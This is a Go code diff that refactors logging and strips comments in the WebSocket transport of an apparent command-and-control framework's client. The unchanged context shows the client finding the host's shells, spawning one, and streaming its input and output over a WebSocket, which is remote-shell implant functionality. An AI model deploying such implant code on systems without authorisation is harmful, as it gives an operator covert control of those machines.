@@ -7,7 +7,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -16,8 +15,8 @@ import (
 	"time"
 
 	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
-
 	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
 
 	"github.com/gorilla/websocket"
@@ -66,21 +65,18 @@ func (t *WebSocketTransport) initShells() {
 	goodShells := []string{"zsh", "bash", "fish", "sh"}
 	potentialShells := []string{}
 
-	// Try known good shells
 	for _, shell := range goodShells {
 		if path, err := exec.LookPath(shell); err == nil {
 			potentialShells = append(potentialShells, filepath.Clean(path))
 		}
 	}
 
-	// Fallback to /etc/shells if none found
 	if len(potentialShells) == 0 {
 		if shells, err := getSystemShells(); err == nil {
 			potentialShells = append(potentialShells, shells...)
 		}
 	}
 
-	// Validate shells
 	for _, s := range potentialShells {
 		if info, err := os.Stat(s); err == nil && !info.IsDir() && info.Mode()&0111 != 0 {
 			t.shells = append(t.shells, s)
@@ -88,13 +84,12 @@ func (t *WebSocketTransport) initShells() {
 	}
 
 	if len(t.shells) == 0 {
-		log.Printf("Warning: No valid shells found")
+		logging.Warn("No valid shells found")
 	} else {
-		log.Printf("Found shells: %v", t.shells)
+		logging.Info("Found shells: %v", t.shells)
 	}
 }
 
-// getSystemShells reads /etc/shells to find valid system shells.
 func getSystemShells() ([]string, error) {
 	file, err := os.Open("/etc/shells")
 	if err != nil {
@@ -122,7 +117,6 @@ func getSystemShells() ([]string, error) {
 	return potentialShells, nil
 }
 
-// StartStreamingSession initiates a WebSocket-based shell session.
 func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *local_models.StreamingConfig, resultChan chan<- models.CommandResult) error {
 	if sessionType != "shell" {
 		err := fmt.Errorf("unsupported session type: %s", sessionType)
@@ -179,7 +173,6 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 	errChan := make(chan error, 1)
 	go t.handleShellSession(cmd, resultChan, errChan)
 
-	// Monitor errors from goroutine
 	go func() {
 		if err := <-errChan; err != nil {
 			resultChan <- models.CommandResult{
@@ -199,7 +192,6 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 	return nil
 }
 
-// startShellProcess spawns a shell process based on the provided shell type.
 func (t *WebSocketTransport) startShellProcess(shellType local_models.ShellType, config *local_models.StreamingConfig) (*exec.Cmd, error) {
 	shellPath := ""
 	for _, shell := range t.shells {
@@ -241,15 +233,14 @@ func (t *WebSocketTransport) startShellProcess(shellType local_models.ShellType,
 	return cmd, nil
 }
 
-// handleShellSession manages the shell process and WebSocket communication.
 func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<- models.CommandResult, errChan chan<- error) {
 	defer t.CloseSession("shell")
 	defer func() {
 		if err := cmd.Process.Kill(); err != nil && !errors.Is(err, os.ErrProcessDone) {
-			log.Printf("Failed to kill shell process: %v", err)
+			logging.Error("Failed to kill shell process: %v", err)
 		}
 		if err := cmd.Wait(); err != nil && !errors.Is(err, os.ErrProcessDone) {
-			log.Printf("Shell process wait error: %v", err)
+			logging.Error("Shell process wait error: %v", err)
 		}
 	}()
 
@@ -277,7 +268,6 @@ func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<-
 	var wg sync.WaitGroup
 	wg.Add(2)
 
-	// Read stdout
 	go func() {
 		defer wg.Done()
 		buf := bytes.NewBuffer(nil)
@@ -295,7 +285,6 @@ func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<-
 		}
 	}()
 
-	// Read stderr
 	go func() {
 		defer wg.Done()
 		buf := bytes.NewBuffer(nil)
@@ -313,7 +302,6 @@ func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<-
 		}
 	}()
 
-	// Handle WebSocket input
 	for {
 		select {
 		case <-t.ctx.Done():
